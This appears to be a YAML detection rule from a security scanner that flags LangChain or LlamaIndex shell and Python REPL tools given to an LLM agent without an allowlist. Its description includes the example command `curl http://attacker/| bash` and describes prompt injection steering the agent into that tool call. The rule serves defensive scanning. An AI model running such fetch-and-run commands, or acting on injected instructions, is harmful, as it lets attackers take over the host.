  - id: "langchain_shell_tool_unconstrained"
    category: "ai_ml_security"
    severity: "CRITICAL"
    title: "LangChain / LlamaIndex ShellTool Exposed To Agent Without allowlist"
    description: "A task deploys code that instantiates `langchain_community.tools.shell.tool.ShellTool`, `langchain_experimental.tools.PythonREPLTool`, `llama_index.core.tools.ShellTool`, or a custom `Tool(name='shell', func=os.system)` and binds it to an agent WITHOUT a command allowlist / sandbox. Under prompt-injection (the default threat model for any RAG-fed agent), the LLM will dispatch `os.system('curl http://attacker/| bash')` on the first malicious tool-call token. This is CWE-1427 (Generative AI Response with Insufficient Output Neutralization) + CWE-78 combined and is the #1 finding in the 2024 OWASP LLM Top-10 v1.1 (LLM07: Insecure Plugin Design)."
    regex: "(?:ShellTool\\s*\\(|PythonREPLTool\\s*\\(|Tool\\s*\\([^)]{0,200}func\\s*=\\s*(?:os\\.system|subprocess\\.(?:run|Popen|call|check_output))\\b)"
    positive_examples:
      - "ShellTool("
    multiline: true
    window: 10
    recommendation: "Never bind an unconstrained shell tool to an LLM agent. If shell capability is required, wrap it in an allowlist+argv-validation shim: `Tool(name='ls_project', func=lambda _: subprocess.run(['ls', PROJECT_DIR], check=True, capture_output=True).stdout)`. Run all tool executions in a locked-down sandbox (gVisor, Firecracker, or a per-request disposable container with no secrets and no outbound network). Apply guardrails (NeMo Guardrails, Llama Guard 3) before the tool-dispatch step."
    cwe: ['CWE-78', 'CWE-94', 'CWE-1427']
    cve: ["CVE-2023-36258", "CVE-2023-44467"]
    owasp_appsec: ["A03:2021"]
